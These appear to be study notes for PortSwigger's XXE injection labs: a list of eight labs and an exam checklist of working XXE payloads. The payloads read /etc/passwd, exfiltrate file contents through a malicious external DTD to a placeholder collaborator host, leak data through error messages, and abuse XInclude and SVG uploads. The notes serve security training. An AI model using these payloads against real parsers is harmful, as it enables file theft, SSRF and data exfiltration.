# [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)

## Labs

- apprentice:
  - [1. Exploiting XXE using external entities to retrieve files](./lab/1.%20Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files.md)
  - [2. Exploiting XXE to perform SSRF attacks](./lab/2.%20Exploiting%20XXE%20to%20perform%20SSRF%20attacks.md)
- practitioner:
  - [3. Blind XXE with out-of-band interaction](./lab/3.%20Blind%20XXE%20with%20out-of-band%20interaction.md)
  - [4. Blind XXE with out-of-band interaction via XML parameter entities](./lab/4.%20Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities.md)
  - [5. Exploiting blind XXE to exfiltrate data using a malicious external DTD](./lab/5.%20Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD.md)
  - [6. Exploiting blind XXE to retrieve data via error messages](./lab/6.%20Exploiting%20blind%20XXE%20to%20retrieve%20data%20via%20error%20messages.md)
  - [7. Exploiting XInclude to retrieve files](./lab/7.%20Exploiting%20XInclude%20to%20retrieve%20files.md)
  - [8. Exploiting XXE via image file upload](./lab/8.%20Exploiting%20XXE%20via%20image%20file%20upload.md)
- expert:

## Checklist for exam

- payload:
  - read the contents:

  ```xml
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  ```

  - oob interaction:

  ```xml
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://collaborator"> ]>
  ```

  - external dtd

    ```xml
    <!DOCTYPE stockcheck [<!ENTITY % xxe SYSTEM "http://exploit-server/poc.dtd">%xxe; ]>
    ```

    - poc.dtd (read contents via oob):

      ```xml
      <!ENTITY % file SYSTEM "file:///etc/hostname">
      <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
      %eval;
      %exfiltrate;
      ```

    - poc.dtd (read contents via error):

      ```xml
      <!ENTITY % file SYSTEM "file:///etc/hostname">
      <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
      %eval;
      %error;
      ```

  - XInclude (b64-encoded payload because it contains non-printable characters):

    ```base64
    %3cfoo%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%0d%0a%3cxi%3ainclude%20parse%3d%22text%22%20href%3d%22file%3a%2f%2f%2fetc%2fpasswd%22%2f%3e%3c%2ffoo%3e
    ```

  - svg file:

    ```xml
    <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
    ```
